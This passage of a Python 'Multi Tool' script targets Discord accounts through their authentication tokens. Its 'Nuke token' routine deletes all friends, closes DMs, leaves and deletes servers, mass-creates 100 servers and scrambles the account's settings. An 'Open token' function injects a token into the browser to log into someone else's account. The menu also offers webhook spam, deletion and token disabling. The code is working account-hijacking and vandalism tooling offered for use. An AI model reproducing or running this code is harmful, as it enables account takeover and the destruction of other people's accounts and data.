        print(f"{c}[{w}Nuke token{c}] {w}| Removing all friends{c}...")
        headers = {"authorization": Token, "user-agent": "bruh6/9"}
        remove_friends_request = requests.get(
            "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
        ).json()
        for i in remove_friends_request:
            requests.delete(
                f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
                headers=headers,
            )
        print(f"{c}[{w}Nuke token{c}] {w}| Removing all friends finished{c}.")
        print(f"{c}[{w}Nuke token{c}] {w}| Closing all dms{c}...")
        headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
        close_dm_request = requests.get(
            "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
        ).json()
        for channel in close_dm_request:
            requests.delete(
                f"https://canary.discord.com/api/v8/channels/{channel['id']}",
                headers=headers,
            )
        print(f"{c}[{w}Nuke token{c}] {w}| Closing all dms finished{c}.")
        print(f"{c}[{w}Nuke token{c}] {w}| Leaving all servers{c}...")
        headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
        leave_all_servers_request = requests.get(
            "https://canary.discord.com/api/v8/users/@me/guilds", headers=headers
        ).json()
        for guild in leave_all_servers_request:
            requests.delete(
                f"https://canary.discord.com/api/v8/users/@me/guilds/{guild['id']}",
                headers=headers,
            )
        headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
        delete_personal_request = requests.get(
            "https://discord.com/api/v9/users/@me/guilds", headers=headers
        ).json()
        for i in delete_personal_request:
            requests.post(
                f"https://canary.discord.com/api/v9/guilds/{i['id']}/delete",
                headers=headers,
            )
        print(f"{c}[{w}Nuke token{c}] {w}| Leaving all servers finished{c}.")
        print(f"{c}[{w}Nuke token{c}] {w}| Mass creating servers{c}...")
        headers = {"authorization": Token, "user-agent": "bruh6/9"}
        for i in range(int(100)):
            string1=''.join(random.choices(string.ascii_letters, k=1))
            string2=''.join(random.choices(string.ascii_letters, k=1))
            payload = {"name": f"{string1} {server_name} {string2}"}
            spam_server_request = requests.post(
                "https://canary.discord.com/api/v8/guilds", headers=headers, json=payload
                )
        print(f"{c}[{w}Nuke token{c}] {w}| Mass creating servers finished{c}.")
        print(f"{c}[{w}Nuke token{c}] {w}| Fucking up settings{c}...")
        headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
        payload = {"theme": "light", "developer_mode": True, "afk_timeout": 60, "locale": "ko", "message_display_compact": True, "explicit_content_filter": 2, "default_guilds_restricted": True, "friend_source_flags": {"all": True, "mutual_friends": True, "mutual_guilds": True}, "inline_embed_media": True, "inline_attachment_media": True, "gif_auto_play": True, "render_embeds": True, "render_reactions": True, "animate_emoji": True, "convert_emoticons": True, "animate_stickers": 1, "enable_tts_command": True,  "native_phone_integration_enabled": True, "contact_sync_enabled": True, "allow_accessibility_detection": True, "stream_notifications_enabled": True, "status": "idle", "detect_platform_accounts": True, "disable_games_tab": True}
        requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
        print(f"{c}[{w}Nuke token{c}] {w}| Fucking up settings finished{c}.")
        sleep(.3)
        exit=input(f"{c}[{w}Nuke token{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()
    elif tkn.status_code == 401:
        print(f"{c}[{w}Nuke token{c}] {w}| {Fore.RED}Invalid token{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Nuke token{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()
    else:
        print(f"{c}[{w}Nuke token{c}] {w}| {Fore.RED}Invalid token{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Nuke token{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()

def open_tkn():
    ctypes.windll.kernel32.SetConsoleTitleW("Open token | Lodi#0001")
    token=input(f"{c}[{w}Open token{c}] {w}| {c}Enter token{w}: ")
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    tkn = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
    if tkn.status_code == 200:
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option("detach", True)
        driver = webdriver.Chrome('chromedriver.exe', options=opts)
        script = """
                function login(token) {
                setInterval(() => {
                document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
                }, 50);
                setTimeout(() => {
                location.reload();
                }, 2500);
                }   
                """
        driver.get("https://discordapp.com/login") 
        driver.execute_script(script+f'\nlogin("{token}")')
        os.system('cls' if os.name == 'nt' else 'clear')
        sleep(.3)
        exit=input(f"{c}[{w}Open token{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()
    elif tkn.status_code == 401:
        print(f"{c}[{w}Open token{c}] {w}| {Fore.RED}Invalid token{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Open token{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()
    else:
        print(f"{c}[{w}Open token{c}] {w}| {Fore.RED}Invalid token{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Open token{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()

def options():
    if theme == "blue":
        print(f"                    {Fore.LIGHTCYAN_EX}┌─────────{Fore.CYAN}──────────────────────────────{Fore.LIGHTBLUE_EX}──────────────────────────────{Fore.BLUE}─────────┐")
        print(f"                    {Fore.LIGHTCYAN_EX}[{w}1{Fore.LIGHTCYAN_EX}]  {w}Delete webhook                                              Token info  {Fore.BLUE}[{w}5{Fore.BLUE}]")
        print(f"                    {Fore.LIGHTCYAN_EX}[{w}2{Fore.LIGHTCYAN_EX}]  {w}Spam webhook                                                Open token  {Fore.BLUE}[{w}6{Fore.BLUE}]")
        print(f"                    {Fore.LIGHTCYAN_EX}[{w}3{Fore.LIGHTCYAN_EX}]  {w}Modify webhook                                           Disable token  {Fore.BLUE}[{w}7{Fore.BLUE}]")
        print(f"                    {Fore.LIGHTCYAN_EX}[{w}4{Fore.LIGHTCYAN_EX}]  {w}Webhook info                                                Nuke token  {Fore.BLUE}[{w}8{Fore.BLUE}]")
        print(f"                    {Fore.LIGHTCYAN_EX}└─────────{Fore.CYAN}──────────────────────────────{Fore.LIGHTBLUE_EX}──────────────────────────────{Fore.BLUE}─────────┘")
    elif theme == "red":
        print(f"                    {Fore.LIGHTRED_EX}┌─────────{Fore.RED}──────────────────────────────{Fore.LIGHTRED_EX}──────────────────────────────{Fore.RED}─────────┐")
        print(f"                    {Fore.LIGHTRED_EX}[{w}1{Fore.LIGHTRED_EX}]  {w}Delete webhook                                              Token info  {Fore.RED}[{w}5{Fore.RED}]")
        print(f"                    {Fore.LIGHTRED_EX}[{w}2{Fore.LIGHTRED_EX}]  {w}Spam webhook                                                Open token  {Fore.RED}[{w}6{Fore.RED}]")
        print(f"                    {Fore.LIGHTRED_EX}[{w}3{Fore.LIGHTRED_EX}]  {w}Modify webhook                                           Disable token  {Fore.RED}[{w}7{Fore.RED}]")
        print(f"                    {Fore.LIGHTRED_EX}[{w}4{Fore.LIGHTRED_EX}]  {w}Webhook info                                                Nuke token  {Fore.RED}[{w}8{Fore.RED}]")
        print(f"                    {Fore.LIGHTRED_EX}└─────────{Fore.RED}──────────────────────────────{Fore.LIGHTRED_EX}──────────────────────────────{Fore.RED}─────────┘")
    elif theme == "purple":
        print(f"                    {Fore.LIGHTMAGENTA_EX}┌─────────{Fore.MAGENTA}──────────────────────────────{Fore.LIGHTMAGENTA_EX}──────────────────────────────{Fore.MAGENTA}─────────┐")
        print(f"                    {Fore.LIGHTMAGENTA_EX}[{w}1{Fore.LIGHTMAGENTA_EX}]  {w}Delete webhook                                              Token info  {Fore.MAGENTA}[{w}5{Fore.MAGENTA}]")
        print(f"                    {Fore.LIGHTMAGENTA_EX}[{w}2{Fore.LIGHTMAGENTA_EX}]  {w}Spam webhook                                                Open token  {Fore.MAGENTA}[{w}6{Fore.MAGENTA}]")
        print(f"                    {Fore.LIGHTMAGENTA_EX}[{w}3{Fore.LIGHTMAGENTA_EX}]  {w}Modify webhook                                           Disable token  {Fore.MAGENTA}[{w}7{Fore.MAGENTA}]")
        print(f"                    {Fore.LIGHTMAGENTA_EX}[{w}4{Fore.LIGHTMAGENTA_EX}]  {w}Webhook info                                                Nuke token  {Fore.MAGENTA}[{w}8{Fore.MAGENTA}]")
        print(f"                    {Fore.LIGHTMAGENTA_EX}└─────────{Fore.MAGENTA}──────────────────────────────{Fore.LIGHTMAGENTA_EX}──────────────────────────────{Fore.MAGENTA}─────────┘")
    elif theme == "green":
        print(f"                    {Fore.LIGHTGREEN_EX}┌─────────{Fore.GREEN}──────────────────────────────{Fore.LIGHTGREEN_EX}──────────────────────────────{Fore.GREEN}─────────┐")
        print(f"                    {Fore.LIGHTGREEN_EX}[{w}1{Fore.LIGHTGREEN_EX}]  {w}Delete webhook                                              Token info  {Fore.GREEN}[{w}5{Fore.GREEN}]")
        print(f"                    {Fore.LIGHTGREEN_EX}[{w}2{Fore.LIGHTGREEN_EX}]  {w}Spam webhook                                                Open token  {Fore.GREEN}[{w}6{Fore.GREEN}]")
        print(f"                    {Fore.LIGHTGREEN_EX}[{w}3{Fore.LIGHTGREEN_EX}]  {w}Modify webhook                                           Disable token  {Fore.GREEN}[{w}7{Fore.GREEN}]")
        print(f"                    {Fore.LIGHTGREEN_EX}[{w}4{Fore.LIGHTGREEN_EX}]  {w}Webhook info                                                Nuke token  {Fore.GREEN}[{w}8{Fore.GREEN}]")
        print(f"                    {Fore.LIGHTGREEN_EX}└─────────{Fore.GREEN}──────────────────────────────{Fore.LIGHTGREEN_EX}──────────────────────────────{Fore.GREEN}─────────┘")
    option_choice=input(f"\n{c}[{w}Multi Tool{c}] {w}| {c}Choice{w}: ")
    cls()
    menu()
    if option_choice == "1":
        webhook_delete()
    elif option_choice == "2":
        webhook_spammer()
    elif option_choice == "3":
        webhook_modify()
    elif option_choice == "4":
        webhook_info()
    elif option_choice == "5":
        token_info()
    elif option_choice == "6":
        open_tkn()
    elif option_choice == "7":
        token_disabler()
    elif option_choice == "8":
        nuke_token()
    elif option_choice == "q":
        os._exit(os.X_OK)
    else:
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
        options()

menu()
options() # :)
